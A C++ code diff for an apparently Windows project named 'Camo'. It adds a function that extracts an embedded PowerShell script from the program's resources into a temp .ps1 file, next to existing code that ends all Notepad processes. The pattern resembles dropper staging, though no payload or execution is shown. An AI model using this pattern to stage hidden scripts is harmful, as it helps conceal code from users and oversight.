@@ -1,6 +1,38 @@
 #include "Camo.h"
-#include <tlhelp32.h>
+#include <fstream>
+#include <windows.h>
 #include <string>
+#include "resource.h"
+
+// Extracts the embedded PowerShell script to a temp .ps1 file and returns its path
+std::wstring ExtractScriptToTempFile()
+{
+    // Locate resource in the main executable
+    HRSRC hRes = FindResource(nullptr, MAKEINTRESOURCE(IDR_PS_SCRIPT), L"TEXT");
+    if (!hRes) return L"";
+
+    HGLOBAL hData = LoadResource(nullptr, hRes);
+    if (!hData) return L"";
+
+    DWORD size = SizeofResource(nullptr, hRes);
+    const char* pData = static_cast<const char*>(LockResource(hData));
+    if (!pData || size == 0) return L"";
+
+    // Get temp path and create a unique .ps1 file name
+    wchar_t tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+
+    wchar_t tempFile[MAX_PATH];
+    // Use a unique name with .ps1 extension
+    wsprintfW(tempFile, L"%sPS_%08X.ps1", tempPath, GetTickCount());
+
+    // Write resource data to temp file
+    std::ofstream ofs(tempFile, std::ios::binary);
+    ofs.write(pData, size);
+    ofs.close();
+
+    return tempFile;
+}
 
 // Terminates all running Notepad instances
 void TerminateAllNotepadInstances()
